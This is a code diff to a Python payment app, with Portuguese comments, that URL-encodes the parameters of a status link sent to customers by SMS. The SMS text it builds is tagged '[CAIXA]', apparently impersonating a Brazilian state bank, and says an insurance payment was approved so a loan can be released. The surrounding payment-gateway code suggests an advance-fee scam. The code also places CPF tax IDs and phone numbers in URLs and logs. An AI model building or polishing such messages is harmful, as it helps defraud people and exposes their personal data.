@@ -383,6 +383,25 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
         # Criar mensagem personalizada com link para thank_you_url
         nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
         
+        # Garantir que a URL está codificada corretamente
+        # Se a URL ainda não estiver codificada, o API SMSDEV pode não encurtá-la completamente
+        import urllib.parse
+        # Verificar se a URL já foi codificada verificando se tem caracteres de escape como %20
+        if '%' not in thank_you_url and (' ' in thank_you_url or '&' in thank_you_url):
+            # Extrair a base da URL e os parâmetros
+            if '?' in thank_you_url:
+                base_url, query_part = thank_you_url.split('?', 1)
+                params = {}
+                for param in query_part.split('&'):
+                    if '=' in param:
+                        key, value = param.split('=', 1)
+                        params[key] = value
+                
+                # Recriar a URL com parâmetros codificados
+                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
+                thank_you_url = f"{base_url}?{query_string}"
+                app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
+        
         # Mensagem mais informativa para o cliente
         message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
         
@@ -691,9 +710,12 @@ def check_payment_status(transaction_id):
             if phone:
                 params['phone'] = phone
                 
-            # Construir a URL completa com parâmetros
+            # Construir a URL completa com parâmetros codificados corretamente para evitar problemas de encurtamento
             if params:
-                thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
+                # Usar urllib para codificar os parâmetros corretamente
+                import urllib.parse
+                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
+                thank_you_url += '?' + query_string
             
             app.logger.info(f"[PROD] URL personalizado de agradecimento: {thank_you_url}")
             
@@ -962,9 +984,12 @@ def check_for4payments_status():
             if cpf:
                 params['cpf'] = cpf
                 
-            # Construir a URL completa com parâmetros
+            # Construir a URL completa com parâmetros codificados corretamente
             if params:
-                thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
+                # Usar urllib para codificar os parâmetros corretamente
+                import urllib.parse
+                query_string = '&'.join([f"{key}={urllib.parse.quote(str(value))}" for key, value in params.items()])
+                thank_you_url += '?' + query_string
             
             # Enviar SMS apenas se o número de telefone estiver disponível
             if phone:
